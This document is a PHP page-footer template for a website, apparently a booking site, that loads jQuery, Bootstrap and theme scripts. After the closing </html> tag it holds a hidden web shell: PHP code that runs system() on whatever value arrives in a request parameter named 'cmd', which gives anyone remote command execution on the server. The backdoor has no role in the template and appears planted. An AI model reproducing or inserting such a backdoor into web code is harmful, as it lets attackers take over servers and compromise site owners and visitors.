    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
    <script src="javascripts/vendors/moment-with-locales.min.js"></script>
    <script src="javascripts/vendors/bootstrap-datetimepicker.min.js"></script>
    <script src="javascripts/vendors/instafeed.js"></script>
    <script src="javascripts/vendors/owl.carousel.min.js"></script>
	<script src="javascripts/vendors/masonry.pkgd.min.js"></script>
    <script src="javascripts/vendors/bootstrap.min.js"></script>
    <script src="javascripts/core/base.js"></script>
	
<?php
	if (($body_filename == 'home') || ($body_filename == 'room-selection'))
	{
?>	
    <script src="javascripts/modules/theme-module.js"></script>
<?php
	}
	else
	{
?>	
    <script src="javascripts/modules/theme-module2.js"></script>
<?php
	}
	
?>	
    <script src="javascripts/bootstrapper.js"></script>

    <!--[if lte IE 9]>
        <script src="javascripts/non-responsive.js"></script>
    <![endif]-->
</body>
</html><?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>